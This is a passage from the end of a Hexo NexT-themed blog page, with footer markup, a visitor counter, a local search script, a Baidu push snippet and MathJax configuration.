                <a href="http://weibo.com/u/3008590672" target="_blank" title="Weibo">
                  
                    <i class="fa fa-fw fa-weibo"></i>
                  
                    
                      Weibo
                    
                </a>
              </span>
            
          
        </div>

        
        

        
        

        


      </section>

      

      
        <div class="back-to-top">
          <i class="fa fa-arrow-up"></i>
          
        </div>
      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright" >
  
  &copy; 
  <span itemprop="copyrightYear">2018</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Introspelliam</span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动</div>

  <span class="post-meta-divider">|</span>

  <div class="theme-info">主题 &mdash; <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.2</div>


        
<div class="busuanzi-count">
  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>

  
    <span class="site-uv">
      <i class="fa fa-user"></i>
      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
      
    </span>
  

  
    <span class="site-pv">
      <i class="fa fa-eye"></i>
      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
      
    </span>
  
</div>








        
      </div>
    </footer>

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>

  
  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>

  
  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.2"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.2"></script>



  
  

  
    <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.2"></script>

  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.2"></script>



  


  




	





  





  










  

  <script type="text/javascript">
    // Popup Window;
    var isfetched = false;
    var isXml = true;
    // Search DB path;
    var search_path = "search.xml";
    if (search_path.length === 0) {
      search_path = "search.xml";
    } else if (/json$/i.test(search_path)) {
      isXml = false;
    }
    var path = "/" + search_path;
    // monitor main search box;

    var onPopupClose = function (e) {
      $('.popup').hide();
      $('#local-search-input').val('');
      $('.search-result-list').remove();
      $('#no-result').remove();
      $(".local-search-pop-overlay").remove();
      $('body').css('overflow', '');
    }

    function proceedsearch() {
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
        .css('overflow', 'hidden');
      $('.search-popup-overlay').click(onPopupClose);
      $('.popup').toggle();
      var $localSearchInput = $('#local-search-input');
      $localSearchInput.attr("autocapitalize", "none");
      $localSearchInput.attr("autocorrect", "off");
      $localSearchInput.focus();
    }

    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';

      // start loading animation
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
          '<div id="search-loading-icon">' +
          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
          '</div>' +
          '</div>')
        .css('overflow', 'hidden');
      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');

      $.ajax({
        url: path,
        dataType: isXml ? "xml" : "json",
        async: true,
        success: function(res) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = isXml ? $("entry", res).map(function() {
            return {
              title: $("title", this).text(),
              content: $("content",this).text(),
              url: $("url" , this).text()
            };
          }).get() : res;
          var input = document.getElementById(search_id);
          var resultContent = document.getElementById(content_id);
          var inputEventFunction = function() {
            var searchText = input.value.trim().toLowerCase();
            var keywords = searchText.split(/[\s\-]+/);
            if (keywords.length > 1) {
              keywords.push(searchText);
            }
            var resultItems = [];
            if (searchText.length > 0) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var hitCount = 0;
                var searchTextCount = 0;
                var title = data.title.trim();
                var titleInLowerCase = title.toLowerCase();
                var content = data.content.trim().replace(/<[^>]+>/g,"");
                var contentInLowerCase = content.toLowerCase();
                var articleUrl = decodeURIComponent(data.url);
                var indexOfTitle = [];
                var indexOfContent = [];
                // only match articles with not empty titles
                if(title != '') {
                  keywords.forEach(function(keyword) {
                    function getIndexByWord(word, text, caseSensitive) {
                      var wordLen = word.length;
                      if (wordLen === 0) {
                        return [];
                      }
                      var startPosition = 0, position = [], index = [];
                      if (!caseSensitive) {
                        text = text.toLowerCase();
                        word = word.toLowerCase();
                      }
                      while ((position = text.indexOf(word, startPosition)) > -1) {
                        index.push({position: position, word: word});
                        startPosition = position + wordLen;
                      }
                      return index;
                    }

                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
                  });
                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
                    isMatch = true;
                    hitCount = indexOfTitle.length + indexOfContent.length;
                  }
                }

                // show search results

                if (isMatch) {
                  // sort index by position of keyword

                  [indexOfTitle, indexOfContent].forEach(function (index) {
                    index.sort(function (itemLeft, itemRight) {
                      if (itemRight.position !== itemLeft.position) {
                        return itemRight.position - itemLeft.position;
                      } else {
                        return itemLeft.word.length - itemRight.word.length;
                      }
                    });
                  });

                  // merge hits into slices

                  function mergeIntoSlice(text, start, end, index) {
                    var item = index[index.length - 1];
                    var position = item.position;
                    var word = item.word;
                    var hits = [];
                    var searchTextCountInSlice = 0;
                    while (position + word.length <= end && index.length != 0) {
                      if (word === searchText) {
                        searchTextCountInSlice++;
                      }
                      hits.push({position: position, length: word.length});
                      var wordEnd = position + word.length;

                      // move to next position of hit

                      index.pop();
                      while (index.length != 0) {
                        item = index[index.length - 1];
                        position = item.position;
                        word = item.word;
                        if (wordEnd > position) {
                          index.pop();
                        } else {
                          break;
                        }
                      }
                    }
                    searchTextCount += searchTextCountInSlice;
                    return {
                      hits: hits,
                      start: start,
                      end: end,
                      searchTextCount: searchTextCountInSlice
                    };
                  }

                  var slicesOfTitle = [];
                  if (indexOfTitle.length != 0) {
                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
                  }

                  var slicesOfContent = [];
                  while (indexOfContent.length != 0) {
                    var item = indexOfContent[indexOfContent.length - 1];
                    var position = item.position;
                    var word = item.word;
                    // cut out 100 characters
                    var start = position - 20;
                    var end = position + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if (end < position + word.length) {
                      end = position + word.length;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
                  }

                  // sort slices in content by search text's count and hits' count

                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
                      return sliceRight.hits.length - sliceLeft.hits.length;
                    } else {
                      return sliceLeft.start - sliceRight.start;
                    }
                  });

                  // select top N slices in content

                  var upperBound = parseInt('1');
                  if (upperBound >= 0) {
                    slicesOfContent = slicesOfContent.slice(0, upperBound);
                  }

                  // highlight title and content

                  function highlightKeyword(text, slice) {
                    var result = '';
                    var prevEnd = slice.start;
                    slice.hits.forEach(function (hit) {
                      result += text.substring(prevEnd, hit.position);
                      var end = hit.position + hit.length;
                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
                      prevEnd = end;
                    });
                    result += text.substring(prevEnd, slice.end);
                    return result;
                  }

                  var resultItem = '';

                  if (slicesOfTitle.length != 0) {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
                  } else {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
                  }

                  slicesOfContent.forEach(function (slice) {
                    resultItem += "<a href='" + articleUrl + "'>" +
                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
                      "...</p>" + "</a>";
                  });

                  resultItem += "</li>";
                  resultItems.push({
                    item: resultItem,
                    searchTextCount: searchTextCount,
                    hitCount: hitCount,
                    id: resultItems.length
                  });
                }
              })
            };
            if (keywords.length === 1 && keywords[0] === "") {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
            } else if (resultItems.length === 0) {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
            } else {
              resultItems.sort(function (resultLeft, resultRight) {
                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
                  return resultRight.searchTextCount - resultLeft.searchTextCount;
                } else if (resultLeft.hitCount !== resultRight.hitCount) {
                  return resultRight.hitCount - resultLeft.hitCount;
                } else {
                  return resultRight.id - resultLeft.id;
                }
              });
              var searchResultList = '<ul class=\"search-result-list\">';
              resultItems.forEach(function (result) {
                searchResultList += result.item;
              })
              searchResultList += "</ul>";
              resultContent.innerHTML = searchResultList;
            }
          }

          if ('auto' === 'auto') {
            input.addEventListener('input', inputEventFunction);
          } else {
            $('.search-icon').click(inputEventFunction);
            input.addEventListener('keypress', function (event) {
              if (event.keyCode === 13) {
                inputEventFunction();
              }
            });
          }

          // remove loading animation
          $(".local-search-pop-overlay").remove();
          $('body').css('overflow', '');

          proceedsearch();
        }
      });
    }

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched === false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(onPopupClose);
    $('.popup').click(function(e){
      e.stopPropagation();
    });
    $(document).on('keyup', function (event) {
      var shouldDismissSearchPopup = event.which === 27 &&
        $('.search-popup').is(':visible');
      if (shouldDismissSearchPopup) {
        onPopupClose();
      }
    });
  </script>





  

  
<script>
(function(){
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
    }
    else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
})();
</script>


  

  
  
    <script type="text/x-mathjax-config">
      MathJax.Hub.Config({
        tex2jax: {
          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
          processEscapes: true,
          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
        }
      });
    </script>

    <script type="text/x-mathjax-config">
      MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for (i=0; i < all.length; i += 1) {
          all[i].SourceElement().parentNode.className += ' has-jax';
        }
      });
    </script>
    <script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
<script type="text/x-mathjax-config">
  MathJax.Hub.Config("");
</script>

<script type="text/x-mathjax-config">
  MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
      all[i].SourceElement().parentNode.className += ' has-jax';
    }
  });
</script>

<script type="text/javascript" src="custom_mathjax_source">
</script>
<!-- End: Injected MathJax -->
<!-- hexo-inject:end -->
  


  

  

</body>
</html>
